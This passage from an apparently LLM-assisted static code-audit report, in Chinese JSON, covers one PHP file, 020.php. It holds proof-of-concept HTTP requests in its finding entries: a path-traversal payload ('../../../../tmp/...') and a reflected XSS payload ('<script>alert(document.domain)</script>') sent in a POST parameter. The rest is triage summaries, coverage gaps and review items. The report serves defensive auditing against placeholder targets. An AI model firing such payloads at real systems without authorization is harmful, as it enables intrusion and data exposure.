\"（人工比对两次响应，无需额外请求）\", \"expected_response\": \"步骤 2 响应与基线存在可归因于路径穿越的差异（内容泄露、绝对路径报错或文件副作用）\"}], \"payload\": \"../../../../tmp/sunset_GENdda61.txt\", \"impact\": \"攻击者可读取或写入预期目录之外的文件，导致敏感信息泄露、配置篡改，严重时可升级为代码执行。\", \"cve_justification\": \"符合 CWE-22。漏洞位于 020.php:15，外部输入来自 POST 参数 include，source→sink 链在给定代码范围内静态闭合，未发现有效净化；具备远程触发条件。证据等级：llm_inferred（基于源码推断，未动态验证）。\", \"script_notes\": \"POC 仅为文本工件，不执行、不联网。执行前将 TARGET 替换为授权测试实例；注意写操作副作用。\"}, {\"finding_id\": \"LLM-370901c0cb4c\", \"description\": \"针对 020.php:17 的反射型 XSS（CWE-79）POC。POST 参数 include 的值未经 HTML 编码即回显到响应页面，可注入 <script> 执行任意脚本。目标地址使用 TARGET 占位符，仅限授权测试。\", \"preconditions\": [\"目标应用已部署，路由 /020.php 可达且接受 POST\", \"020.php:17 处将 POST 参数 include 原样输出到 HTML 响应，未做 htmlspecialchars 等编码（依据源码静态推断，llm_inferred）\", \"已获得明确书面授权，仅对 TARGET 占位符指向的测试实例操作\"], \"steps\": [{\"step\": 1, \"action\": \"基线请求：确认路由可达并记录正常响应\", \"request\": \"POST /020.php HTTP/1.1\\r\\nHost: TARGET:8080\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 20\\r\\n\\r\\ninclude=SUNSET_PROBE\", \"expected_response\": \"返回应用正常页面，SUNSET_PROBE 以纯文本形式出现\"}, {\"step\": 2, \"action\": \"发送 XSS 载荷，观察是否原样回显\", \"request\": \"POST /020.php HTTP/1.1\\r\\nHost: TARGET:8080\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 61\\r\\n\\r\\ninclude=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\", \"expected_response\": \"响应体中 <script>alert(document.domain)</script> 未被编码，浏览器加载后弹出 document.domain\"}, {\"step\": 3, \"action\": \"状态确认：对比基线与攻击响应，确认脚本标签未被转义\", \"request\": \"（人工比对两次响应体，无需额外请求）\", \"expected"
+      },
+      {
+        "agent": "coordinator",
+        "label": "summary",
+        "ok": true,
+        "rejected": 0,
+        "data": "{\"summary\": \"本次汇总基于单文件 PHP 脚本 020.php（27 行）的已去重 findings，共 4 条，全部带 POC（with_poc=4）。最高危为 020.php 第 15 行：$_POST['include'] 未编码直接拼入 <script src> 属性，同时被规则判为 path_traversal（GEN-dda61ef2bad8，high）与 client_side_validation（SEM-cc52c467496c，high），LLM 侧同点判为反射型 XSS（LLM-370901c0cb4c，medium，行 17）；另有第 3 行 CSP script-src 白名单过宽（SEM-582e93de1b73，medium）。需注意：该点本质是输出注入/属性注入，path_traversal 的类型标签与标题描述（“输出注入，非路径穿越”）不一致，交付时应以 XSS/输出编码缺失为主类型，path_traversal 标签需人工纠正。4 条 POC 均为 HTTP 型（POST 参数反射），但均未动态验证，仅为静态文本工件。\", \"policy_note\": \"本次档位 min_severity=low，min_confidence=0.6，抑制 0 条（suppressed_count=0，suppressed_by_type 为空）；无策略抑制项，但“未抑制”不等于“已穷尽”，sink_hot_files 为空说明数据流匹配不完整。\", \"top_findings\": [{\"finding_id\": \"GEN-dda61ef2bad8\", \"why\": \"020.php 第 15 行 $_POST['include'] 未做 HTML 属性编码即拼入 <script src>，攻击者可闭合属性注入任意脚本/外链，high；但类型标为 path_traversal 与标题自述“非路径穿越”矛盾，建议改判 xss/输出编码缺失。\"}, {\"finding_id\": \"SEM-cc52c467496c\", \"why\": \"同一行外部脚本引入缺少服务端白名单校验（CWE-602），与上条同源，high；实际风险应合并到输出注入主线上评估，避免重复计数。\"}, {\"finding_id\": \"LLM-370901c0cb4c\", \"why\": \"对同一 sink 的反射型 XSS 判定（medium，行 17），与两条 high 规则命中指向同一代码点，可作为主类型依据；POC 为 POST include 参数注入脚本 URL。\"}, {\"finding_id\": \"SEM-582e93de1b73\", \"why\": \"020.php 第 3 行 CSP script-src 白名单过宽（CWE-693），会削弱对上述脚本注入的缓解，medium；属配置型证据，需结合响应头实际下发情况复核。\"}], \"coverage_gaps\": [\"仅覆盖 1 个 PHP 文件、1 种语言，无框架、无端点清单（endpoints=0），无法确认 020.php 是否对外可达及认证/授权机制。\", \"sink_hot_files 为空，source→sink 数据流判定不完整；020.php 的 2 处 source 热点是否还流入 include/echo/exec/system/文件/SQL 等汇点未确认。\", \"无 php.ini、Web 服务器配置、composer.json 依赖清单，无法评估运行环境安全配置与组件 CVE。\", \"无部署方式与版本信息，实际可利用性取决于是否直接暴露于 Web 根目录。\", \"weak_hash / weak_crypto / weak_random / insecure_cookie / trust_boundary 五类配置型候选未产出 findings，属未交付而非未检出，需按档位与代码逐行复核。\"], \"human_review\": [\"020.php 第 15 行类型冲突：path_traversal 标签与“输出注入”描述不符，需人工确认最终 CWE 归类（建议 CWE-79/CWE-116），并合并 GEN-dda61ef2bad8 与 SEM-cc52c467496c 的重复计数。\", \"surface_notes 的 medium_review_items 未被任何 finding 覆盖：weak_hash（md5/sha1/crc32，CWE-328）、weak_crypto（DES/ECB/固定 IV，CWE-327）、weak_random（rand/mt_rand/uniqid 生成令牌，CWE-338）、insecure_cookie（setcookie/session_set_cookie_params 缺 HttpOnly/Secure/SameSite）均需代码逐行复核，属静态证据范畴，不能宣称可动态复现。\", \"trust_boundary：需代码/会话语义复核，确认是否直接信任 $_SERVER['HTTP_X_FORWARDED_FOR']、REMOTE_ADDR 或客户端传入角色/权限参数；该类无 HTTP 响应信号，不得写成已验证。\", \"surface_notes 风险点：sink_hot_files 为空不能判定无漏洞，需人工核对 PHP 语境特殊入口/汇点（$_REQUEST 批量取参、extract()、include $_GET、exec/system）。\", \"CSP 条目（SEM-582e93de1b73）需确认响应头是否实际下发及 script-src 具体白名单内容，当前仅为源码静态证据。\", \"全部 4 条 POC 均为静态文本工件，未执行、未搭建沙箱、未动态验证；仅限授权测试，目标统一使用 TARGET 占位符。\"], \"type\": \"json_object\"}"
+      }
+    ],
+    "surface_notes": {
+      "scope_summary": "项目为单文件 PHP 脚本（020.php，27 行，约 1KB），无框架、无路由/端点清单，语言统计仅 php。入口与认证特征无法从清单确认：endpoints 为空，source_hot_files 仅标注 020.php 有 2 处 source 热点，sink_hot_files 为空，说明管线未识别到明确危险汇点。整体看更像教学/示例级 PHP 片段而非完整 Web 应用，攻击面测绘只能基于该单文件，价值有限。",
+      "priority_areas": [
+        {
+          "area": "020.php 中的请求参数入口（source 热点）及其后续数据流",
+          "files": [
+            "020.php"
+          ],
+          "reason": "source_hot_files 显示 020.php 有 2 处 source 热点，是本次唯一可审计的输入入口；但 sink_hot_files 为空，需人工确认参数是否流入 include/echo/文件/命令/SQL 等汇点，以及是否存在 getParameterMap/getParameterNames 类批量取参、new File(param,...)、putValue、setSecure(false) 等特殊入口。",
+          "priority": 1
+        },
+        {
+          "area": "020.php 的配置/实现类风险（加密、哈希、随机数、Cookie/session）",
+          "files": [
+            "020.php"
+          ],
+          "reason": "文件仅 27 行，若含 md5/sha1、rand/mt_rand、setcookie/session_start 等调用，则属无 HTTP 污点也可成立的配置型候选（weak_hash/weak_random/insecure_cookie）；清单未提供代码内容，需人工逐行确认。",
+          "priority": 2
+        }
+      ],
+      "risk_notes": [
+        "sink_hot_files 为空，不能据此判定无漏洞，只说明管线未匹配到已知危险汇点模式；020.php 的 2 处 source 是否可达汇点仍未确认。",
+        "单文件 27 行、无框架、无端点，若为示例代码，实际可利用性取决于部署方式（是否直接暴露于 Web 根目录），当前无法确认。",
+        "未发现 getParameterMap()/getParameterNames()/Runtime.exec(args, env)/new File(param,...)/putValue/setSecure(false) 等特殊入口或汇点的证据，但这些模式在 PHP 语境下对应物（如 $_REQUEST 批量取参、extract()、include $_GET、exec/system）需人工在 020.php 内核对。",
+        "输入中未出现诱导性文本，无 prompt_injection 证据。"
+      ],
+      "coverage_gaps": [
+        "仅有 1 个 PHP 源文件，无配置文件（php.ini、Web 服务器配置）、无依赖清单（composer.json），无法确认运行环境与安全配置。",
+        "endpoints 为空，无法确认 HTTP 路由、认证与授权机制，也无法判断 020.php 是否对外可达。",
+        "无 sink 热点与代码片段，无法完成 source→sink 数据流判定；本报告仅为攻击面测绘，不含漏洞结论。",
+        "无部署方式、无日志/版本信息，无法评估 CVE 层面的组件风险。"
+      ],
+      "medium_review_items": [
+        {
+          "type": "weak_hash",
+          "file": "020.php",
+          "reason": "文件短小且为 PHP 脚本，需人工确认是否使用 md5()/sha1()/crc32() 等弱哈希处理口令或令牌（CWE-328）。"
+        },
+        {
+          "type": "weak_crypto",
+          "file": "020.php",
+          "reason": "需确认是否使用 mcrypt/DES/ECB 模式或 openssl_encrypt 的 ECB/固定 IV 等弱加密实现（CWE-327）。"
+        },
+        {
+          "type": "weak_random",
+          "file": "020.php",
+          "reason": "需确认是否用 rand()/mt_rand()/uniqid() 生成令牌、验证码或会话标识（CWE-338）。"
+        },
+        {
+          "type": "insecure_cookie",
+          "file": "020.php",
+          "reason": "需确认 setcookie()/session_set_cookie_params() 是否缺少 HttpOnly/Secure/SameSite 标志，或存在 setSecure(false) 等价写法。"
+        },
+        {
+          "type": "trust_boundary",
+          "file": "020.php",
+          "reason": "需确认是否直接信任 $_SERVER['HTTP_X_FORWARDED_FOR']、$_SERVER['REMOTE_ADDR'] 或客户端传入的角色/权限参数作为信任边界判断依据。"
+        }
+      ]
+    },
+    "finding": {
+      "enabled": true,
+      "mode": "on",
+      "tool_calls": 0,
+      "files": 1,
+      "chars": 1199,
+      "truncated_files": 0,
+      "findings": 1,
+      "duplicates": 0,
+      "rejected": [],
+      "suppressed": [],
+      "summary": "本次仅审计 code_pack 中唯一文件 020.php（27 行）。发现 1 条闭合链：POST 参数 include 未编码拼入 <script src> 属性导致反射型 XSS（020.php:13-17），且 CSP 白名单含公共 CDN 无法缓解。其余为攻击面测绘线索：文件未见 md5/sha1、rand/mt_rand、setcookie/session、exec/system、include $_GET 等调用，故 weak_hash/weak_random/insecure_cookie/命令注入等候选无代码证据，不单独立项。endpoints 为空、无配置文件与依赖清单，无法评估路由、认证与组件 CVE；020.php 是否对外可达需人工确认。",
+      "gaps": [
+        "无 php.ini/Web 服务器配置，无法确认运行环境与 CSP 实际生效",
+        "endpoints 为空，无法确认路由与认证机制",
+        "无 composer.json，无法评估依赖组件 CVE",
+        "020.php 是否部署于 Web 根目录未确认"
+      ],
+      "note": "单次 LLM 调用；请求体不含 tools/tool_choice/function calling；file_path 与行号由服务端校验，code_snippet 由真实源码回填。",
+      "rejected_count": 0,
+      "audited_files": [
+        "020.php"
+      ]
+    },
+    "policy_note": "本次档位 min_severity=low，min_confidence=0.6，抑制 0 条（suppressed_count=0，suppressed_by_type 为空）；无策略抑制项，但“未抑制”不等于“已穷尽”，sink_hot_files 为空说明数据流匹配不完整。"
+  },
+  "limitations": [
+    "只做源码静态分析，不构建、不部署、不执行 POC、不搭建沙箱。",
+    "finding 的 verdict 为 candidate 或 external，不是动态确认。",
+    "POC 仅为文本工件，目标使用 TARGET 占位符，仅限授权测试。",
+    "规则为轻量级启发式，复杂控制流/常量传播/跨文件调用可能漏报或误报。",
+    "AWVS 是外部动态扫描器，结果只作为佐证；本管线不执行 AWVS 扫描。"
+  ]
+}
